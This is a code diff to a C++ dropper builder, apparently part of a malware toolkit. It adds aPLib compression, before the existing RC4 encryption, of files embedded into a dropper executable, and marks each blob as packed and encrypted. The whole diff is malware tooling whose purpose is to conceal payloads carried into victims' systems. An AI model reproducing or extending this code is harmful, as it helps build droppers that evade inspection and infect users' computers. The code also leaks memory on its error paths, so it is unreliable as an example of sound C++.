@@ -4,6 +4,8 @@
 #include <boost/filesystem.hpp>
 namespace bf = boost::filesystem;
 
+#include <aplib.h>
+
 #include "PEObject.h"
 #include "DropperObject.h"
 #include "XRefNames.h"
@@ -272,48 +274,70 @@ int DropperObject::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionB
 	return size;
 }
 
+unsigned int ratio(unsigned int x, unsigned int y)
+{
+	if (x <= UINT_MAX / 100) x *= 100; else y /= 100;
+	if (y == 0) y = 1;
+	return x / y;
+}
+
+int __stdcall callback(unsigned int insize, unsigned int inpos, unsigned int outpos, void *cbparam)
+{
+	printf("\rcompressed %u -> %u bytes (%u%% done)", inpos, outpos, ratio(inpos, insize));
+	return 1;
+}
+
 char* DropperObject::_embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
 {
 	// check if we have some data to be appended
 	if (source.buffer == NULL && source.size <= 0)
 		return ptr;
-	
+
 	// copy name of file
 	name.offset = ptr - _data.get();
 	name.size = source.name.size() + 1;
 	memcpy(ptr, source.name.c_str(), name.size);
 	ptr += name.size;
 	
-#if 0
-	// encrypt data
-	int insize = source.size;
+#if defined PACK_DATA
+	file.characteristics |= APLIB_PACKED;
+	int length = source.size;
 	
-	char* packed = new char[aP_max_packed_size(insize)];
-	if (packed == NULL)
-		return 0;
-	char* workmem = new char[aP_workmem_size(insize)];
+	char* packed = (char*) malloc(aP_max_packed_size(length));
 	if (packed == NULL)
 		return 0;
 	
-	int packed_size = aPsafe_pack(source.buffer, packed, insize, workmem, NULL, NULL);
-	if (workmem)
-		delete [] workmem;
-#endif
-
+	char* workmem = (char*) malloc(aP_workmem_size(length));
+	if (workmem == NULL)
+		return 0;
+	
+	int packed_size = aP_pack(source.buffer.get(), packed, length, workmem, callback, NULL);
+	printf("\n");
+	if (packed_size == APLIB_ERROR) {
+		printf("Error compressing!\n");
+		return 0;
+	}
+	
+	if (workmem) free(workmem);
+#else
 	char* packed = source.buffer.get();
 	int packed_size = source.size;
+#endif
 	
 	file.offset = ptr - _data.get();
+	file.original_size = source.size;	
 	file.size = packed_size;
-	
+
 	// crypt and write file
+	file.characteristics |= RC4_CRYPTED;
 	rc4crypt((unsigned char*)rc4key, RC4KEYLEN, (unsigned char*)packed, packed_size);
 	memcpy(ptr, packed, packed_size);
 	ptr += packed_size;
-	
-	// XXX uncomment
-	// delete [] packed;
-	
+
+#if defined PACK_DATA
+	free(packed);
+#endif
+
 	return ptr;
 }
 
